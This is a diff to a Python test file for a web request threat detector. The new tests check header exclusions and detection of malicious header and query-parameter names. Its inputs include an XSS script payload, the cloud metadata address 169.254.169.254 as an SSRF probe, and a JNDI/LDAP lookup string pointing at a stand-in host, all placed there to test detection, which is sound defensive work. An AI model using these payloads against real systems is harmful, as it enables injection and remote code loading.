@@ -86,9 +86,17 @@ class _FakeRequest:
         return self._body_bytes
 
 
-def test_excluded_header_suppresses_match() -> None:
+def test_excluded_header_generic_name_still_detects_non_address_categories() -> None:
     config = SecurityConfig(excluded_detection_headers={"x-raw"})
     request = _FakeRequest(headers={"x-raw": "<script>alert(1)</script>"})
+    _result = detect_penetration_attempt(request, config)
+    detected = _result.is_threat
+    assert detected is True
+
+
+def test_excluded_header_address_value_suppresses_ssrf_only() -> None:
+    config = SecurityConfig(excluded_detection_headers={"x-raw"})
+    request = _FakeRequest(headers={"x-raw": "169.254.169.254"})
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
     assert detected is False
@@ -135,7 +143,7 @@ def test_route_exclusion_adds_to_global_header_exclusions() -> None:
     config = SecurityConfig()
     route_config = RouteConfig()
     route_config.excluded_detection_headers = {"x-raw"}
-    request = _FakeRequest(headers={"x-raw": "<script>alert(1)</script>"})
+    request = _FakeRequest(headers={"x-raw": "169.254.169.254"})
     _result = detect_penetration_attempt(request, config, route_config)
     detected = _result.is_threat
     assert detected is False
@@ -503,3 +511,45 @@ def test_excluded_body_field_with_other_threat_field_still_detects() -> None:
     trigger = _result.trigger_info
     assert detected is True
     assert "other" in trigger
+
+
+def test_excluded_header_all_enabled_categories_excluded_skips_scan() -> None:
+    config = SecurityConfig(enabled_detection_categories={"ssrf"})
+    request = _FakeRequest(headers={"x-real-ip": "169.254.169.254"})
+    _result = detect_penetration_attempt(request, config)
+    detected = _result.is_threat
+    assert detected is False
+
+
+def test_excluded_header_malicious_name_detected_via_shield() -> None:
+    malicious_name = "${jndi:ldap://evil.example/a}"
+    config = SecurityConfig(excluded_detection_headers={malicious_name})
+    request = _FakeRequest(headers={malicious_name: "benign"})
+    _result = detect_penetration_attempt(request, config)
+    detected = _result.is_threat
+    assert detected is True
+
+
+def test_sensitive_query_param_value_threat_is_logged_redacted() -> None:
+    request = _FakeRequest(query_params={"password": "<script>alert(1)</script>"})
+    _result = detect_penetration_attempt(request)
+    detected = _result.is_threat
+    assert detected is True
+
+
+def test_malicious_query_param_name_is_detected() -> None:
+    request = _FakeRequest(query_params={"<script>alert(1)</script>": "harmless"})
+    _result = detect_penetration_attempt(request)
+    detected = _result.is_threat
+    trigger = _result.trigger_info
+    assert detected is True
+    assert "Query param name" in trigger
+
+
+def test_malicious_header_name_is_detected() -> None:
+    request = _FakeRequest(headers={"<script>alert(1)</script>": "harmless"})
+    _result = detect_penetration_attempt(request)
+    detected = _result.is_threat
+    trigger = _result.trigger_info
+    assert detected is True
+    assert "Header name" in trigger
